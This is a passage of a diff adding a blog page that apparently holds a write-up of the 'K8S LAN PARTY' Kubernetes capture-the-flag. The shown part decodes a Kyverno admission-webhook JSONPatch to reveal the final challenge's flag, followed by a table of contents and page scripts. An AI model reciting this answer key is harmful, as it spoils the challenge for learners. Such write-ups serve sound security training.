class="string">&quot;W3sib3AiOiJyZXBsYWNlIiwicGF0aCI6Ii9zcGVjL2NvbnRhaW5lcnMvMC9lbnYvMC92YWx1ZSIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9LCB7InBhdGgiOiIvbWV0YWRhdGEvYW5ub3RhdGlvbnMiLCJvcCI6ImFkZCIsInZhbHVlIjp7InBvbGljaWVzLmt5dmVybm8uaW8vbGFzdC1hcHBsaWVkLXBhdGNoZXMiOiJpbmplY3QtZW52LXZhcnMuYXBwbHktZmxhZy10by1lbnYua3l2ZXJuby5pbzogcmVwbGFjZWQgL3NwZWMvY29udGFpbmVycy8wL2Vudi8wL3ZhbHVlXG4ifX1d&quot;</span>,<span class="string">&quot;patchType&quot;</span>:<span class="string">&quot;JSONPatch&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>W3sib3AiOiJyZXBsYWNlIiwicGF0aCI6Ii9zcGVjL2NvbnRhaW5lcnMvMC9lbnYvMC92YWx1ZSIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9LCB7InBhdGgiOiIvbWV0YWRhdGEvYW5ub3RhdGlvbnMiLCJvcCI6ImFkZCIsInZhbHVlIjp7InBvbGljaWVzLmt5dmVybm8uaW8vbGFzdC1hcHBsaWVkLXBhdGNoZXMiOiJpbmplY3QtZW52LXZhcnMuYXBwbHktZmxhZy10by1lbnYua3l2ZXJuby5pbzogcmVwbGFjZWQgL3NwZWMvY29udGFpbmVycy8wL2Vudi8wL3ZhbHVlXG4ifX1d</code> base64decode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;op&quot;:&quot;replace&quot;,&quot;path&quot;:&quot;/spec/containers/0/env/0/value&quot;,&quot;value&quot;:&quot;wiz_k8s_lan_party&#123;you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory&#125;&quot;&#125;, &#123;&quot;path&quot;:&quot;/metadata/annotations&quot;,&quot;op&quot;:&quot;add&quot;,&quot;value&quot;:&#123;&quot;[policies.kyverno.io/last-applied-patches&quot;:&quot;inject-env-vars.apply-flag-to-env.kyverno.io:](&lt;http://policies.kyverno.io/last-applied-patches%22:%22inject-env-vars.apply-flag-to-env.kyverno.io:&gt;) replaced /spec/containers/0/env/0/value\\n&quot;&#125;&#125;]</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Article</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Background"><span class="toc-number">1.</span> <span class="toc-text">Background</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.</span> <span class="toc-text">地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4"><span class="toc-number">1.2.</span> <span class="toc-text">时间</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-1%EF%BC%9ARECON"><span class="toc-number">2.</span> <span class="toc-text">Challenge 1：RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">2.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%84%E5%BD%95"><span class="toc-number">2.4.</span> <span class="toc-text">附录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-2%EF%BC%9AFINDING-NEIGHBOURS"><span class="toc-number">3.</span> <span class="toc-text">Challenge 2：FINDING NEIGHBOURS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">3.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-1"><span class="toc-number">3.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">3.3.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-3%EF%BC%9ADATA-LEAKAGE"><span class="toc-number">4.</span> <span class="toc-text">Challenge 3：DATA LEAKAGE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">4.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-2"><span class="toc-number">4.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-number">4.3.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nfs-cat-%E5%92%8C-nfs-ls"><span class="toc-number">4.3.1.</span> <span class="toc-text">nfs-cat 和 nfs-ls</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NFS"><span class="toc-number">4.3.2.</span> <span class="toc-text">NFS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-mount"><span class="toc-number">4.3.3.</span> <span class="toc-text">查看 mount</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0-flag"><span class="toc-number">4.3.4.</span> <span class="toc-text">发现 flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-4%EF%BC%9ABYPASSING-BOUNDARIES"><span class="toc-number">5.</span> <span class="toc-text">Challenge 4：BYPASSING BOUNDARIES</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-3"><span class="toc-number">5.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9-3"><span class="toc-number">5.2.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-number">5.3.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lstio"><span class="toc-number">5.3.1.</span> <span class="toc-text">lstio</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iptabl"><span class="toc-number">5.3.2.</span> <span class="toc-text">iptabl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">5.3.3.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hint-%E5%88%86%E6%9E%90"><span class="toc-number">5.3.4.</span> <span class="toc-text">hint 分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81"><span class="toc-number">5.3.5.</span> <span class="toc-text">验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#challenge-5%EF%BC%9ALATERAL-MOVEMENT"><span class="toc-number">6.</span> <span class="toc-text">challenge 5：LATERAL MOVEMENT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-4"><span class="toc-number">6.1.</span> <span class="toc-text">题目描述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Who-will-guard-the-guardians"><span class="toc-number">6.1.1.</span> <span class="toc-text">Who will guard the guardians?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hint"><span class="toc-number">6.1.2.</span> <span class="toc-text">Hint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Policy"><span class="toc-number">6.1.3.</span> <span class="toc-text">Policy</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9-4"><span class="toc-number">7.</span> <span class="toc-text">考点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-number">7.1.</span> <span class="toc-text">分析</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&text=K8S_LAN_PARTY_WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&is_video=false&description=K8S_LAN_PARTY_WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=K8S_LAN_PARTY_WriteUp&body=Check out this article: http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&title=K8S_LAN_PARTY_WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&name=K8S_LAN_PARTY_WriteUp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2024/03/23/K8S-LAN-PARTY-WriteUp/&t=K8S_LAN_PARTY_WriteUp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    psych
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
